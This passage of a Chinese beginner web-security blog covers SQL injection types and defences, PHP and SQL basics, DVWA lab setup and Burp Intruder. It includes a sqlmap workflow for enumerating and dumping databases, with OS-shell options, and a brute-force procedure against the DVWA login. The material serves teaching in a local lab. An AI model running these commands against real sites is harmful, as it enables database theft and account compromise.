align="center">构造特殊的SQL语句对目标数据进行猜测，使得猜测正确时与猜测错误时页面回显内容不同</td><td align="center">构造特殊的SQL语句对目标数据进行猜测，使得猜测正确时与猜测错误时页面响应时间不同</td></tr><tr><td align="center">目标数据直接在页面显示内容中提取</td><td align="center">必须在网站回显原始报错数据的情况下使用，目标数据在报错信息中提取</td><td align="center">根据页面显示结果推断目标数据内容</td><td align="center">根据页面响应时间推断目标数据内容</td></tr></tbody></table><h2 id="SQL注入漏洞的利用"><a href="#SQL注入漏洞的利用" class="headerlink" title="SQL注入漏洞的利用"></a>SQL注入漏洞的利用</h2><h3 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h3><p>SQLmap 是一个开放源码的渗透测试工具，它可以自动探测和利用SQL注入漏洞来接管数据库服务器。它配备了一个强大的探测引擎，为最终渗透测试人员提供很多强大的功能，可以拖库，可以访问底层的文件系统，还可以通过带外连接执行操作系统上的命令。</p><p>下载地址：<a href="https://github.com/sqlmapproject/sqlmap/">https://github.com/sqlmapproject/sqlmap/</a></p><p>官网地址：<a href="http://sqlmap.org/">http://sqlmap.org/</a></p><p>Linux有自带这个工具</p><h3 id="SQLmap的常见参数使用"><a href="#SQLmap的常见参数使用" class="headerlink" title="SQLmap的常见参数使用"></a>SQLmap的常见参数使用</h3><p>–version     #显示程序的版本号并退出 </p><p>-h, –help     #显示此帮助消息并退出</p><p>-u           #设置目标URL</p><p>-p           #指定测试参数</p><p>-D           #指定要进行枚举的数据库名</p><p>-T           #指定要进行枚举的数据库表</p><p>-C           #指定要进行枚举的数据库列</p><p>-U           #指定要进行枚举的数据库用户</p><p>–current-user    #获取当前用户名称</p><p>–current-db    #获取当前数据库名称</p><p>–cookie        #设置cookie值</p><p>–dbs          #列出数据库</p><p>–tables        #列出数据库中的表</p><p>–columns        #列出表中的列</p><p>–dump            #列出表中的字段</p><p>–sql-shell        #执行SQL命令</p><p>–os-cmd        #执行系统命令</p><p>–os-shell        #与系统交互shell</p><p>-r              #加载外部请求包</p><p>–data=DATA        #通过POST发送数据字符串</p><p>–level=LEVEL    #执行测试的等级(1-5,默认为1）</p><p>–risk=RISK        #执行测试的风险(0-3,默认为1）</p><p> -v VERBOSE        #详细级别：0-6（默认为1）</p><p>–proxy=PROXY    #使用HTTP代理连接到目标URL</p><p>–user-agent    #指定HTTP User-Agent</p><p>–tamper=TAMPER    #使用给定的脚本(S)篡改注入数据</p><h3 id="基本的注入流程"><a href="#基本的注入流程" class="headerlink" title="基本的注入流程"></a>基本的注入流程</h3><p>①　判断注入点和数据类型：</p><p>GET方法注入：sqlmap -u <a href="http://www.test.php/?id=1">http://www.test.php?id=1</a></p><p>POST注入：sqlmap -r /etc/url.txt（使用burpsuite等代理工具拦截POST请求内容，将POST请求内容保存在一个文本文件中，此处为url.txt，并用sqlmap调用）</p><p>②　判断数据库名（dbs）：sqlmap -u “<a href="http://www.test.php/?id=1%E2%80%9D">http://www.test.php?id=1”</a> –dbs </p><p>③　判断表名（tables）：sqlmap -u “<a href="http://www.test.php/?id=1%E2%80%9D">http://www.test.php?id=1”</a> -D 数据库名 –tables</p><p>④　判断列名（columns）：sqlmap -u “<a href="http://www.test.php/?id=1%E2%80%9D">http://www.test.php?id=1”</a> -D 数据库名 -T 表名 –column</p><p>⑤　获取字段：sqlmap -u “<a href="http://www.test.php/?id=1%E2%80%9D">http://www.test.php?id=1”</a> -D 数据库名 -T 表名 -C 列名 –dump</p><p>查看获取的数据文件：</p><p>windows：C:\Users\Administrator.sqlmap\output</p><p>Kali linux： /root/.sqlmap/output</p><h2 id="SQL注入漏洞的防范"><a href="#SQL注入漏洞的防范" class="headerlink" title="SQL注入漏洞的防范"></a>SQL注入漏洞的防范</h2><p>1．过滤：</p><p>通过对SQL关键字和关键符号的过滤来避免SQL注入漏洞的发生</p><p>优点：业务改动量小，部署方便，是安全防护软件/硬件常用的解决方案</p><p>缺点：基于黑名单的工作原理，容易产生误报或被绕过</p><p>2．编码：</p><p>基于各类数据库定义的关键字和符号的转义规则将用户输入进行转义后组成SQL语句</p><p>优点：不影响正常请求且不容易被绕过，OWASP ESAPI项目提供了这种解决方案</p><p>缺点：整改需要一定的工作量，需要数据库自身的支持，且理论上仍存在的绕过风险</p><p>3．预编译：</p><p>基于各种语言的预编译功能，先将SQL语句进行编译，用户输入的内容只会被当做参数传入，不会被编译为命令</p><p>优点：从根本上杜绝了SQL发生的可能性</p><p>缺点：业务改动量大，建议新开发的项目均采用此种方式避免SQL注入攻击的产生。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全基础(二)</title>
      <link href="2020/12/26/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80(%E4%BA%8C)/"/>
      <url>2020/12/26/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h2 id="服务端脚本基础"><a href="#服务端脚本基础" class="headerlink" title="服务端脚本基础"></a>服务端脚本基础</h2><h3 id="静态网页与动态网页"><a href="#静态网页与动态网页" class="headerlink" title="静态网页与动态网页"></a>静态网页与动态网页</h3><p>（1）静态页面，即静态网页，是实际存在的，无需经过服务器的编译，直接加载到客户浏览器上显示出来。静态页面需要占一定的服务器空间，且不能自主管理发布更新的页面。</p><p>（2）动态页面则是以ASP、ASPX、PHP、JSP等，由相应的脚本引擎来解释执行，根据指令生成静态网页。</p><p>​          动态页面上的内容存在于数据库中，根据用户发出的不同请求，其提供个性化的网页内容。</p><p>​          动态页面内容不是存在于页面上，而是存在数据库中，从而大大降低网站的维护工作量。</p><p>​          采用动态网页技术的网站可以实现更多的功能，如用户注册、用户登录、在线调查、用户管理、订单管理等等；静态页面则无法实现这些功能。</p><p>（3）动态页面与静态页面的区别：</p><p>静态页面：html或htm，是一种静态的页面格式，不需要服务器解析其中的脚本，由浏览器解析。</p><p>动态页面：由相应的脚本引擎来解释执行，根据指令生成静态网页，如PHP、JSP、ASPX等。</p><table><thead><tr><th align="center">静态网页</th><th align="center">动态网页</th></tr></thead><tbody><tr><td align="center">不依赖数据库</td><td align="center">依赖数据库</td></tr><tr><td align="center">灵活性差，制作、更新、维护麻烦</td><td align="center">灵活性好，维护简单</td></tr><tr><td align="center">在功能方面有较大的限制，交互性能差</td><td align="center">交互性好，功能强大</td></tr><tr><td align="center">服务端不处理用户输入，安全性高</td><td align="center">服务端需要处理用户输入，安全性低</td></tr></tbody></table><p>直接的区别是动态页面访问相同的页面，客户端获得的源代码可能不同。</p><h3 id="常见的服务端脚本语言"><a href="#常见的服务端脚本语言" class="headerlink" title="常见的服务端脚本语言"></a>常见的服务端脚本语言</h3><p>（1）ASP：是动态服务器页面(Active Server Pages)的英文缩写，也称为经典ASP，动态产生Web页面。</p><p>（2）ASPX：aspx文件是微软的在服务器端运行的动态网页文件,属于ASP.NET技术。ASP.NET是由微软在·NET Framework框架中所提供，开发Web应用程序的类库，封装在System.Web.dll文件中，显露出System.Web命名空间，并提供ASP.NET网页处理、扩充以及HTTP通道的应用程序与通信处理等工作，以及Web Service的基础架构。ASP.NET是ASP技术的后继者，但它的发展性要比ASP技术强大许多</p><p>（3）JSP：全名为Java Server Pages，中文名叫java服务器页面，其根本是一个简化的Servle设计。</p><p>（4）PHP(Hypertext Preprocessor超文本预处理器)是一种通用开源脚本语言，语法吸收了C语言、Java和Perl的特点，利于学习，使用广泛，主要适用于Web开发领域。PHP独特的语法混合了C、Java、Perl以及PHP自创的语法。它可以比CGl或者Perl更快速地执行动态网页。</p><h3 id="PHP语法基础"><a href="#PHP语法基础" class="headerlink" title="PHP语法基础"></a>PHP语法基础</h3><p>（1）PHP文件的默认文件扩展名是”.php”</p><p>（2）PHP脚本可以放置于文档中的任何位置</p><p>（3）PHP文件通常包含HTML标签以及一些PHP脚本代码</p><p>（4）PHP脚本以&lt;?php开头，以?&gt;结尾</p><p>（5）PHP语句以分号结尾(;)</p><p>（6）PHP使用//作为注释符号</p><pre><code class="php">&lt;?php    //此处是PHP代码    ?&gt;</code></pre><h3 id="PHP输出"><a href="#PHP输出" class="headerlink" title="PHP输出"></a>PHP输出</h3><p>（1）echo能够输出一个以上的字符串</p><p>（2）echo是一个语言结构，有无括号均可使用：echo或echo()</p><p>（3）实例：用echo命令来显示不同的字符串(注意：字符串中能包含HTML标记)</p><pre><code class="php">&lt;?phpecho &quot;&lt;h2&gt;PHP很有趣!&lt;/h2&gt;&quot;;echo &quot;Hello world!&lt;br&gt;&quot;;echo &quot;我计划学习PHP! &lt;br&gt;&quot;;echo &quot;这段话&quot;,&quot;由&quot;,&quot;多个&quot;,&quot;字符串&quot;,&quot;串接而成。&quot;;?&gt;</code></pre><p><img src="https://i.loli.net/2020/12/26/PqLGshoaFpf8Vc4.png" alt="image-20201226220748663"></p><h3 id="PHP与HTML结合"><a href="#PHP与HTML结合" class="headerlink" title="PHP与HTML结合"></a>PHP与HTML结合</h3><pre><code class="php">&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt;     &lt;h1&gt;我的第一张PHP页面&lt;/h1&gt;&lt;?php echo &quot;Hello World!&quot;; ?&gt; &lt;/body&gt; &lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/26/4bSYiJCj9IGBHms.png" alt="image-20201226221946820"></p><h3 id="PHP的表单处理"><a href="#PHP的表单处理" class="headerlink" title="PHP的表单处理"></a>PHP的表单处理</h3><h4 id="在HTML上触发GET请求"><a href="#在HTML上触发GET请求" class="headerlink" title="在HTML上触发GET请求"></a>在HTML上触发GET请求</h4><p>（1）HTML可以采用A标签或form表单的形式触发get请求，从带有get方法的表单发送的信息会显示在浏览器的地址栏，并且对发送信息的量也有限制。使用A标签触发get请求时，请求的参数值是固定的。</p><pre><code class="HTML">&lt;!--a标签触发get请求--&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;GET请求&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;a href= &quot;get.php?fname=dayang&amp;age=24&quot;&gt;提交请求&lt;/a&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/26/l2r7OuaxcVoyLjT.png" alt="image-20201226223120376"></p><p><img src="https://i.loli.net/2020/12/26/EHOnCwqbfkh8FpT.png" alt="image-20201226223157764"></p><p>（2）form表单触发GET请求</p><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;urf-8&quot;&gt;        &lt;title&gt;GET请求&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;!--请求目标页面为get.php,请求方式为get--&gt;         &lt;form action=&quot;get.php&quot; method=&quot;get&quot;&gt;                         名字:&lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;            年龄:&lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;            &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2020/12/26/qgwT4RVxsoBFXfS.png" alt="image-20201226225025070"></p><h4 id="GET请求的处理"><a href="#GET请求的处理" class="headerlink" title="GET请求的处理"></a>GET请求的处理</h4><p>$_GET变量用于收集HTTP GET请求中的参数值。服务端处理</p><pre><code class="php">欢迎&lt;?php echo $_GET[&quot;fname&quot;];?&gt;!&lt;br&gt;你的年龄是&lt;?php echo $_GET[&quot;age&quot;];?&gt;岁。</code></pre><p><img src="https://i.loli.net/2020/12/26/4sZ7hPrbRnqTIva.png" alt="image-20201226231005000"></p><h4 id="在HTML上触发POST请求"><a href="#在HTML上触发POST请求" class="headerlink" title="在HTML上触发POST请求"></a>在HTML上触发POST请求</h4><p>（1）HTML可以采用form表单的形式触发POST请求，从带有POST方法的表单发送的数据，不会显示在浏览器的地址栏，并且对发送信息的量也没有限制，常用于传输敏感数据或较大量的数据。</p><p>（2）实例：form表单触发POST请求</p><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;POST请求&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;form action=&quot;post.php&quot; method=&quot;post&quot;&gt;            名字:&lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;            年龄:&lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;            &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="POST请求的处理"><a href="#POST请求的处理" class="headerlink" title="POST请求的处理"></a>POST请求的处理</h4><p>$_POST变量用于收集来自HTTP POST请求中的参数值</p><pre><code class="php">欢迎&lt;?php echo $_POST[&quot;fname&quot;];?&gt;!&lt;br&gt;你的年龄是&lt;?php echo $_POST[&quot;age&quot;];?&gt;岁。</code></pre><h2 id="数据库与SQL基础"><a href="#数据库与SQL基础" class="headerlink" title="数据库与SQL基础"></a>数据库与SQL基础</h2><h3 id="数据库系统基本概念"><a href="#数据库系统基本概念" class="headerlink" title="数据库系统基本概念"></a>数据库系统基本概念</h3><p>（1）数据库：长期存储在计算机内、有组织的、可共享的数据集合</p><p>（2）DBMS(DataBase Management Ssytem):一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库，它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性。常见的DBMS包括access、sqlserver、mysql、oracle、DB2等。</p><h3 id="关系型数据库系统特点"><a href="#关系型数据库系统特点" class="headerlink" title="关系型数据库系统特点"></a>关系型数据库系统特点</h3><p>（1）数据结构化和共享性：库、表、字段；结构化查询(SQL)</p><p>（2）数据独立性：物理独立性，逻辑独立性</p><p>（3）数据的完整性约束：</p><p>实体完整性(通过主键约束条件)</p><p>参照完整性(通过主外键约束条件)</p><p>用户自定义完整性(通过CHECK子句)</p><p>（4）数据由DBMS统一管理和控制：查询引擎、事务控制、数据存储模块/组件</p><p><img src="https://i.loli.net/2020/12/26/1bK2sX6JWvpFoCQ.png" alt="image-20201226234112089"></p><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>（1）概念：SQL语言，是结构化查询语言(Structured Query Language)的简称。SQL语言是一种数据库查询和程序设计语言，用于存储数据以及查询、更新和管理关系数据库系统；同时也是数据库脚本文件的扩展名。</p><p>（2）SQL语句格式：在数据库上执行的大部分工作都由SQL语句完成。注意：SQL对大小写不敏感。#和–后的内容代表注释，在浏览器中–要写为–+</p><p><img src="https://i.loli.net/2020/12/26/p6QNkLcKsZrwg5i.png" alt="image-20201226234657011"></p><h4 id="SELECT语句——基本查询"><a href="#SELECT语句——基本查询" class="headerlink" title="SELECT语句——基本查询"></a>SELECT语句——基本查询</h4><p>（1）cmd进入mysql数据库，前提是设置好环境变量在PATH里面添加D:\SecurityTools\WebTools\phpstudy\PHPTutorial\MySQL\bin</p><p>然后运行cmd命令窗口，输入：mysql -u root -p，回车后输入密码即可进入数据库。</p><p>或者直接用phpstudy打开：其他选项菜单–&gt;MySQL工具–&gt;MySQL命令行</p><p>（2）基本查询：</p><pre><code>show databases;      //查询数据库有哪些use mysql;           //进入或使用mysql数据库  show tables;         //查询mysql数据库中的表</code></pre><p><img src="https://i.loli.net/2020/12/27/WUZ3eGvINQJCnlT.png" alt="image-20201227001655078"></p><h4 id="SELECT语句——AND和OR运算"><a href="#SELECT语句——AND和OR运算" class="headerlink" title="SELECT语句——AND和OR运算"></a>SELECT语句——AND和OR运算</h4><p>（1）AND运算：AND分隔的表达式须同时满足</p><p>（2）OR运算：OR分隔的表达式只需要满足任意一个</p><p><img src="https://i.loli.net/2020/12/27/M9dc7NvyPGBaUbg.png" alt="image-20201227002419442"></p><p><img src="https://i.loli.net/2020/12/27/onBa1mAVIOLfM85.png" alt="image-20201227002127380"></p><p>（3）当AND和OR运算符同时出现时，先进行AND运算，再进行OR运算。优先级=大于and大于or</p><p><img src="https://i.loli.net/2020/12/27/PxGFUetMfmglOI4.png" alt="image-20201227002245210"></p><h2 id="动态页面的工作原理"><a href="#动态页面的工作原理" class="headerlink" title="动态页面的工作原理"></a>动态页面的工作原理</h2><h3 id="动态页面工作流程理解——数据查询"><a href="#动态页面工作流程理解——数据查询" class="headerlink" title="动态页面工作流程理解——数据查询"></a>动态页面工作流程理解——数据查询</h3><p><img src="https://i.loli.net/2020/12/27/9bBDrMq2fA3JXKh.png" alt="image-20201227002758895"></p><p><img src="https://i.loli.net/2020/12/27/SFuhmXac5DQ48E2.png" alt="image-20201227002850094"></p><h4 id="系统登录成功"><a href="#系统登录成功" class="headerlink" title="系统登录成功"></a>系统登录成功</h4><p><img src="https://i.loli.net/2020/12/27/2F3X5vh1WozLGVT.png" alt="image-20201227003308006"></p><h4 id="系统登录失败"><a href="#系统登录失败" class="headerlink" title="系统登录失败"></a>系统登录失败</h4><p><img src="https://i.loli.net/2020/12/27/WgMJ64cFa8hvl5B.png" alt="image-20201227003345200"></p><h3 id="动态网站搭建——DVWA"><a href="#动态网站搭建——DVWA" class="headerlink" title="动态网站搭建——DVWA"></a>动态网站搭建——DVWA</h3><p>（1）首先将DVWA的源代码放进D:\SecurityTools\WebTools\phpstudy\PHPTutorial\WWW中，然后解压DVWA的压缩包。</p><p>（2）配置DVWA链接数据库，打开config文件夹，打开config.inc.php。(注意需要将文件类型改为php)</p><p>（3）需要把db_password修改成root，因为刚安装好的集成环境默认的MySQL连接用户名和密码为root和root。</p><p><img src="https://i.loli.net/2020/12/27/gsv5e4f6WkrwUTN.png" alt="image-20201227004006196"></p><p>（4）登录DVWA，在浏览器地址栏输入127.0.0.1/DVWA/index.php访问</p><p>（5）点击Create/Reset Database后，再次访问。登录初始账号admin，密码password</p><p><img src="https://i.loli.net/2020/12/27/JYNCheTFMkK2wzi.png" alt="image-20201227005759025"></p><p><img src="https://i.loli.net/2020/12/27/N8xrA5q2wlM3eK6.png" alt="image-20201227005235895"></p><h2 id="Burp暴力破解"><a href="#Burp暴力破解" class="headerlink" title="Burp暴力破解"></a>Burp暴力破解</h2><p>暴力破解一般指穷举法，穷举法的基本思想是根据题目的部分条件确定答案的大致范围，并在此范围内对所有可能的情况逐一验证，直到全部情况验证完毕。若某个情况验证符合题目的全部条件，则为本问题的一个解；若全部情况验证后都不符合题目的全部条件，则本题无解。穷举法也称枚举法。</p><h3 id="Burpsuite模块——Intruder模块详解"><a href="#Burpsuite模块——Intruder模块详解" class="headerlink" title="Burpsuite模块——Intruder模块详解"></a>Burpsuite模块——Intruder模块详解</h3><p>（1）Burp Intruder用于自动对Web应用程序自定义的攻击</p><p>（2）Burp Intruder是高度可配置的，并被用来广范围内进行自动化攻击。可以枚举标识符，获取有用数据，漏洞模糊测试。</p><p>（3）合适的攻击类型取决于应用程序的情况，可能包括：</p><p>缺陷测试：SQL注入，跨站点脚本攻击，缓冲区溢出，路径遍历，暴力攻击认证系统，枚举，操纵参数，拖出隐藏的内容和功能，会话令牌测序和会话劫持，数据挖掘，并发攻击，应用层的拒绝服务式攻击。</p><h4 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h4><p>（1）Target用于配置目标服务器进行攻击的详细信息</p><p><img src="https://i.loli.net/2020/12/27/pvnqcXkR5i3WDsU.png" alt="image-20201227010741048"></p><p>（2）Positions设置Payloads的插入点以及攻击类型(攻击模式)</p><p>攻击模式：</p><p>sniper：对变量依次进行破解。多个标记依次进行。</p><p>Battering ram：对变量同时进行破解。多个标记同时进行。</p><p>Pitchfork：每一个变量标记对应一个字典，取每个字典对应项。</p><p>Cluster bomb：每个变量对应一个字典，并且进行交集破解，尝试各种组合。适合用于用户名+密码的破解。</p><p><img src="https://i.loli.net/2020/12/27/PjUBe1bpnXo6wiE.png" alt="image-20201227011237538"></p><p>（3）Payloads设置payload，配置字典</p><p><img src="https://i.loli.net/2020/12/27/h3VcGn6eXlEgOUt.png" alt="image-20201227011344398"></p><h4 id="暴力破解——DVWA"><a href="#暴力破解——DVWA" class="headerlink" title="暴力破解——DVWA"></a>暴力破解——DVWA</h4><p>（1）访问DVWA的地址，点击Brute Force</p><p><img src="https://i.loli.net/2020/12/27/uZomrbMh7LBjIdY.png" alt="image-20201227011547962"></p><p>（2）随便输入用户名，密码，浏览器开启代理后，用burp抓包</p><p>（3）将抓到的包发送到Intruder模块</p><p>（4）设置好目标端口，攻击方式选择Cluster bomb</p><p><img src="https://i.loli.net/2020/12/27/HEwQZUdjAmqLbih.png" alt="image-20201227011758916"></p><p>（5）删除$之后，进入payloads模块，添加密码本，也就是要进行暴力破解时依次验证的每个密码。</p><p>（6）全部设置完后，点击star attck 开始攻击</p><p>（7）在弹出的框中，寻找与其他长度不符合的payload，该payload就是最终破解出来的密码，可以点击”length”排序后快速查找。</p><p><img src="C:\Users\86177\AppData\Roaming\Typora\typora-user-images\image-20201227012152047.png" alt="image-20201227012152047"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全基础(一)</title>
      <link href="2020/12/15/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80(%E4%B8%80)/"/>
      <url>2020/12/15/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB应用安全概述"><a href="#WEB应用安全概述" class="headerlink" title="WEB应用安全概述"></a>WEB应用安全概述</h2><p>（1）WEB应用安全是指WEB应用系统的安全性，由于WEB应用的特点，在安全性方面有许多有别于传统系统安全的内容。</p><p>（2）传统系统安全体系的建立：防火墙、入侵防护系统、漏洞扫描系统。80%以上的攻击通过应用程序漏洞来开展。</p><h3 id="常见WEB应用"><a href="#常见WEB应用" class="headerlink" title="常见WEB应用"></a>常见WEB应用</h3><p>（1）常见应用类型：CMS、论坛、电商平台、业务办理</p><p>（2）常见WEB应用：网站前台和网站后台。二者通常是相对于动态网站而言，即网站建设是基于数据库开发的网站。基于带数据库开发的网站，一般分为网站前台和网站后台。</p><p>（3）网站前台是面向网站用户访问的，通俗的说也就是给访问网站的人看的内容和页面，网站前台访问可以浏览公开发布的内容。</p><p>（4）网站后台，有时也称为网站管理后台，是指用于管理网站前台的一系列操作。网站的后台通常需要账号及密码等信息的登录验证，登录信息正确则验证而后进入网站后台的管理界面进行相关的一系列操作。<strong>由于网站后台具有更高的操作权限，往往是黑客攻击的重要目标.</strong></p><h3 id="WEB应用安全与传统安全的区别"><a href="#WEB应用安全与传统安全的区别" class="headerlink" title="WEB应用安全与传统安全的区别"></a>WEB应用安全与传统安全的区别</h3><table><thead><tr><th align="center">对比项</th><th align="center">传统系统安全</th><th align="center">WEB应用安全</th></tr></thead><tbody><tr><td align="center">通用性</td><td align="center">建立在使用较广的通用软件基础上</td><td align="center">每一个应用相当于一个独立的软件</td></tr><tr><td align="center">开发者</td><td align="center">通常是具有较高专业技术的厂商和人员，对安全有一定的理解</td><td align="center">开发者水平参差不齐，对于安全的理解较为往往不足</td></tr><tr><td align="center">漏洞的检测</td><td align="center">建立在漏洞已知、确定的基础上</td><td align="center">基于业务特点对可能存在的漏洞进行扫描</td></tr><tr><td align="center">漏洞的挖掘</td><td align="center">需要对计算机结构、操作系统原理，底层语言等有很深入的了解，难度大</td><td align="center">只需要掌握一些基础的网站架构、脚本语言、数据库知识就可以开始，难度低</td></tr><tr><td align="center">漏洞的修复</td><td align="center">由专业的厂商提供修复方案</td><td align="center">应用开发人员自行修复</td></tr><tr><td align="center">攻击途径</td><td align="center">多数服务端口不开放在公网上，攻击途径较少</td><td align="center">WEB应用的业务特点导致多数的WEB应用对于互联网是开放的</td></tr><tr><td align="center">攻击特征</td><td align="center">有数据级的攻击特征，攻击行为与正常业务行为的差异明显</td><td align="center">攻击特征不明确，业务逻辑类漏洞在数据层面无攻击特征</td></tr><tr><td align="center">防护难度</td><td align="center">对于已知漏洞的防护较为容易</td><td align="center">防护难度大，容易绕过</td></tr></tbody></table><h2 id="WEB应用的基本架构"><a href="#WEB应用的基本架构" class="headerlink" title="WEB应用的基本架构"></a>WEB应用的基本架构</h2><p>（1）组成：终端用户、应用传输协议http、应用服务器、数据库服务器</p><p>（2）</p><table><thead><tr><th align="center"></th><th align="center">客户端</th><th align="center">服务端</th><th align="center">数据库</th></tr></thead><tbody><tr><td align="center">应用</td><td align="center">客户端浏览器(IE、Firefox…)</td><td align="center">服务端WEB应用(IIS、Apache)</td><td align="center"></td></tr><tr><td align="center">语言</td><td align="center">HTML、javascript、CSS</td><td align="center">PHP、JSP、ASP</td><td align="center">SQL</td></tr></tbody></table><h3 id="WEB服务的提供者——WEB中间件"><a href="#WEB服务的提供者——WEB中间件" class="headerlink" title="WEB服务的提供者——WEB中间件"></a>WEB服务的提供者——WEB中间件</h3><p>WEB中间件是用来提供WEB服务的应用软件，常说的WEB服务器其实就是部署了WEB中间件能够提供WEB服务的服务器，常见的WEB中间件包括IIS、tomcat、apahce、weblogic、Nginx等。</p><h3 id="简单的WEB服务器搭建"><a href="#简单的WEB服务器搭建" class="headerlink" title="简单的WEB服务器搭建"></a>简单的WEB服务器搭建</h3><p><strong>PHPstudy简介</strong></p><p>（1）PHPstudy是一个PHP调试环境的程序集成包</p><p>（2）该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer，一次性安装，无需配置即可使用。该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等。</p><p>（3）该程序包可以很好地解决Windows下环境配置的问题。</p><p><strong>PHPstudy的使用</strong></p><p>（1）打开phpstudy软件，可看到启动、停止、重启的按钮，可对phpstudy进行相应的操作。</p><p>（2）点击PHP版本，可看见phpstudy有多种版本可供选择。</p><p>（3）点击其他选项菜单——网站根目录，可在里面增加文件，即可通过浏览器访问</p><p><strong>PHPstudy的hello world</strong></p><p>（1）新建一个txt文档，在里面写入hello world，然后保存将后缀名改为test.html</p><p>（2）将test.html放入phpstudy的WWW目录中，即根目录下”/“，在url中可以体现文件的所在路径。</p><p>（3）启动phpstudy，在浏览器中输入[<a href="http://127.0.0.1/test.html],%E8%AE%BF%E9%97%AE%E7%BB%93%E6%9E%9C%E5%A6%82%E4%B8%8B%EF%BC%9A">http://127.0.0.1/test.html],访问结果如下：</a></p><h2 id="HTTP协议基础"><a href="#HTTP协议基础" class="headerlink" title="HTTP协议基础"></a>HTTP协议基础</h2><p>（1）HTTP是Hyper Text Transfer Protocol(超文本传输协议)的缩写。HTTP协议是用于从WWW服务器传输超文本到本地浏览器的传送协议。</p><p>（2）HTTP是一个<strong>应用层协议</strong>，由<strong>请求和响应</strong>构成，是一个标准的客户端服务器模型。HTTP是一个无状态的协议。</p><h3 id="网页请求的基本过程"><a href="#网页请求的基本过程" class="headerlink" title="网页请求的基本过程"></a>网页请求的基本过程</h3><p><strong>请求触发–&gt;建立TCP连接–&gt;客户端发送HTTP请求–&gt;服务端返回HTTP响应–&gt;客户端显示结果</strong></p><p>当用户在浏览器中输入网址或点击超链接，网页请求就被发出了，其工作过程可分为四步：</p><p>（1）首先客户端与服务器需要建立TCP连接</p><p>（2）建立连接后，客户端发送一个请求给服务器，请求方式的格式为：统一资源标识符(URL)、协议版本号、后边是MIME信息、请求修饰符、客户机信息和可能的内容。</p><p>（3）服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是MIME信息、服务器信息、实体信息和可能的内容。</p><p>（4）客户端接收服务器所返回的信息通过浏览器显示在用户的显示屏上，然后客户机与服务器断开连接。</p><p>若以上过程的某一步出现错误，则产生错误的信息将返回到客户端，通过显示屏输出。对用户来说，这些过程由HTTP自己完成，对用户透明。</p><h3 id="HackBar工具"><a href="#HackBar工具" class="headerlink" title="HackBar工具"></a>HackBar工具</h3><p>HackBar小工具包，包含一些常用的工具。(SQL injection、XSS、加密等)，web开发人员可以利用该工具，快速构建一个http请求，或者用它快速实现某种算法等。</p><h3 id="BurpSuite工具"><a href="#BurpSuite工具" class="headerlink" title="BurpSuite工具"></a>BurpSuite工具</h3><p>（1）Burp Suite是一个集成化的渗透测试工具，它集合了多种渗透测试组件，能更好地完成对web应用的渗透测试和攻击。</p><p>（2）Burp Suite代理工具是以拦截代理的方式，拦截所有通过代理的网络流量。如客户端的请求数据、服务端的返回信息等。Burp Suite主要拦截http和https协议的流量，通过拦截，Burp Suite以中间人的方式，可以对客户端请求数据、服务端返回做各种处理，以达到安全评估、测试的目的。</p><p><strong>BurpSuite的使用</strong></p><p>（1）配置监听选项：Proxy–&gt;Options，在Proxy 